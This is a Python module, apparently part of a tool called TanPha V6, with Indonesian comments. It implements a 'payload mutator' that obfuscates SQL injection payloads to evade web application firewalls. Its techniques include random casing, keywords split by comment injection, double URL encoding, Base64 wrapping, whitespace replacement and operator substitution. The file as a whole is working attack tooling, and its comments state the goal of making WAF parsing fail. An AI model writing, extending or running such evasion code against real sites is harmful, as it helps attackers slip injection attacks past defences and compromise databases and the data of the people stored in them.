"""Payload Mutator Engine for TanPha V6 (Genetic/Advanced Obfuscation)."""
import random
import urllib.parse
import base64

class PayloadMutator:
    def __init__(self):
        # Daftar teknik obfuscation
        self.techniques = [
            self._random_case,
            self._inject_comments,
            self._url_encode,
            self._base64_encode,
            self._replace_whitespace,
            self._operator_substitution
        ]

    def _random_case(self, payload):
        """Ngubah huruf besar/kecil secara acak (SeLeCt)."""
        return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)

    def _inject_comments(self, payload):
        """Nambahin komentar SQL di tengah kata (SEL/**/ECT)."""
        keywords = ["SELECT", "UNION", "AND", "OR", "FROM", "WHERE"]
        for kw in keywords:
            if kw in payload.upper():
                mixed = random.choice([f"{kw[:3]}/**/{kw[3:]}", f"{kw[0]}/**/{kw[1:]}"])
                payload = payload.replace(kw, mixed).replace(kw.lower(), mixed)
        return payload

    def _url_encode(self, payload):
        """Nge-encode payload biar WAF gagal parsing (double encoding)."""
        # Encode karakter khusus aja
        return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")

    def _base64_encode(self, payload):
        """Bungkus payload pakai Base64 (kalau DBMS support)."""
        b64 = base64.b64encode(payload.encode()).decode()
        return f"CONVERT_FROM(DECODE('{b64}', 'BASE64'), 'UTF-8')"

    def _replace_whitespace(self, payload):
        """Ganti spasi jadi karakter unik (tab, newline, dll)."""
        ws = ["/**/", "\t", "\n", "+", "%20", "%09"]
        return payload.replace(" ", random.choice(ws))

    def _operator_substitution(self, payload):
        """Ganti operator SQL dengan alternatif."""
        payload = payload.replace(" AND ", random.choice([" && ", " & ", " AND "]))
        payload = payload.replace(" OR ", random.choice([" || ", " | ", " OR "]))
        payload = payload.replace("=", random.choice([" LIKE ", " = ", " REGEXP "]))
        return payload

    def mutate(self, payload, iterations=1):
        """Ngejalanin mutasi secara acak sebanyak N kali."""
        mutated = payload
        for _ in range(iterations):
            # Pilih 1-2 teknik acak buat digabung
            chosen_techs = random.sample(self.techniques, k=random.randint(1, 2))
            for tech in chosen_techs:
                mutated = tech(mutated)
        return mutated
